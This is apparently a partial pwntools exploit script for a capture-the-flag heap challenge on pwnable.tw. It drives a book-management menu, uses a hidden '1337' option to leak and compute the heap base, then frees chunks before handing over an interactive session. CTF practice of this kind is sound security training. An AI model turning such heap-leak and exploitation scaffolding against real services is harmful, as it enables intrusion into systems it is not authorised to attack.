#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("chall")

local = True 
if local:
    p = process("./chall")
    gdb.attach(p,'''c''')
else:
    p = remote('chall.pwnable.tw', 10001)

elf = context.binary = ELF('./chall', checksec=False)

def signature(data):
    p.sendlineafter(b">", data)
    print("========= SIGNATURE =========")

def write_book(idx, data):
    p.sendlineafter(b"Option:", b"1")
    p.sendlineafter(b"Index:", str(idx))
    p.sendafter(b"long!", data)
    print("========= WRITE_BOOK =========")

def rewrite_book(idx, data):
    p.sendlineafter(b"Option:", b"2")
    p.sendlineafter(b"Index:", str(idx))
    p.sendafter(b"before.", data)
    print("========= REWRITE_BOOK =========")

def throw_book(idx):
    p.sendlineafter(b"Option:", b"3")
    p.sendlineafter(b"Index:", str(idx))
    print("========= THROW_BOOK =========")

def exit():
    p.sendafter(b"Option:", b"4")





signature(b"wwwww")
for i in range(10):
    write_book(i+1, str(i)*32)

p.sendlineafter(b"Option:", b"1337")
p.sendlineafter(b"number?", b"1")
p.recvuntil(b"e: 0x")
heap_base = int(p.recv(7), 16) - 15632
print("[+]Heap_base:    ", hex(heap_base))

for i in range(10):
    throw_book(i)
    
p.interactive()